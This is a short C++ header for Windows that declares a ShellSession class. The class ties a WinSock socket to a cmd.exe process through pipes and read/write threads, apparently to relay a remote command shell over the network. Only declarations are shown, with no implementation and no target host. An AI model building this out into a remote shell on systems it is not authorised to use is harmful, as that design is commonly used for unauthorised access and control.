#pragma once

#include <WinSock2.h>

#define BUFFER_SIZE 1024
#define HANDLE_LIST_SIZE 3
#define DEFAULT_WIN_SHELL "\\system32\\cmd.exe"

class ShellSession
{
private:
	SOCKET Socket;
	HANDLE hShell;
	HANDLE hReadPipe;
	HANDLE hWritePipe;
	HANDLE hShellReadThread;
	HANDLE hShellWriteThread;
	CRITICAL_SECTION csReadPipe;
	HANDLE CreateShell(HANDLE hPipeStdInput, HANDLE hPipeStdOutput);
	// Thread Starter
	static DWORD WINAPI StartReadShell(LPVOID lpParam);
	static DWORD WINAPI StartWriteShell(LPVOID lpParam);
	// Threads
	DWORD ReadShell();
	DWORD WriteShell();
public:
	ShellSession();
	~ShellSession();
	DWORD Init(SOCKET Socket);
	DWORD Wait();
	void Close();
};
